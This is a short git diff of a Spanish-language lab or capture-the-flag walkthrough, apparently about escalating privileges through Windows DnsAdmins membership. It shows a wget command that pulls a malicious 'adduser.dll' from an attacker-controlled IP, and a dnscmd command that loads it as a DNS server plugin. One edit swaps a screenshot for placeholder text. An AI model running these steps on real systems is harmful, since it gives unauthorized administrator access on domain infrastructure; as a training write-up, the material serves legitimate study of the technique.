@@ -427,9 +427,9 @@ wget "http://10.10.14.27:7777/adduser.dll" -outfile "adduser.dll"
 <img width="761" height="396" alt="image" src="https://github.com/user-attachments/assets/48040e95-1b95-4ead-b338-11c5d9b7f219" />
 Cargamos la dll con el siguiente comando:
 ```powershel
-dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
+dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\adduser.dll
 ```
-<img width="756" height="94" alt="image" src="https://github.com/user-attachments/assets/c25fa8ef-bdb7-47b0-b513-d3b9278acf47" />
+xxxxxxx
 
 Para que estos cambios tengan efecto, el servicio dns debe reiniciarse. Procedemos a verificar si tenemos los permisos para reiniciar el servicio.
 
